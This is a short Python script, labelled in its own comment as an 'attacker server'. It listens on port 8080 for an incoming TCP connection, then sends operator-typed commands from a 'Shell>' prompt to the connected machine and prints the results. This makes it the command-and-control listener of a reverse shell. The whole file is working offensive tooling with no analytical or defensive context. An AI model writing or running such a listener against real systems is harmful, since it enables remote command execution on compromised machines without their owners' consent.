# attacker server
import socket

ip = "0.0.0.0"
port = 8080

def connect():
    Mysocket = socket.socket()
    Mysocket.bind((ip, port))
    Mysocket.listen(1)
    connection, addres = Mysocket.accept()
    print("Connection established sucessfully", addres)

    while True:
        command = input("Shell> : ")
        if "terminate" in command:
            connection.send("terminate".encode())
            connection.close()
            break
        else:
            connection.send(command.encode())
            print(connection.recv(1024).decode())

def main():
    print("="*20)
    print("[+] Listening for incoming TCP connection on port", port)
    connect()

main()
